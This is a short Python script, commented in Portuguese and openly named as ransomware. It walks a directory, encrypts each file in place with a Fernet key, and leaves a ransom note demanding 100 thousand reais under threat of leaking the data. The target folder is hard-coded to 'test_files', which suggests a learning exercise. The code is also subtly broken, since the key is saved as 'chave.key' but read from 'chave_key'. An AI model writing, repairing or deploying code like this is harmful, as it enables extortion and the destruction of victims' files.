from cryptography.fernet import Fernet
import os


#1. gerar uma chave de criptografia e salvar

def gerar_chave():
    chave = Fernet.generate_key() 
    with open("chave.key","wb") as chave_file:
        chave_file.write(chave)

#2. Carregar a chave salva

def carregar_chave():
    return open("chave_key", "rb").read()

#3. Criptografar um unico arquivo

def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_encryptados = f.encrypt(dados)
    with open(arquivo, "wb") as  file:
        file.write(dados_encryptados)

#4. Encontrar arquivos para criptografar

def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransoware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

#5. Mensagem de resgate

def criar_mensagem_resgaste():
    with open("LEIA ISSO.txt", "w") as f:
        f.write("Seus arquivos foram criptografados!\n")
        f.write("Envie para mim 100 mil reais ou irei vazar todos os dados \n")
        f.write("Disponibilizarei os dados em seu computador")
def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem_resgaste()
    print("Ransoware executado! Arquivos criptografos!")

if __name__=="__main__":
    main()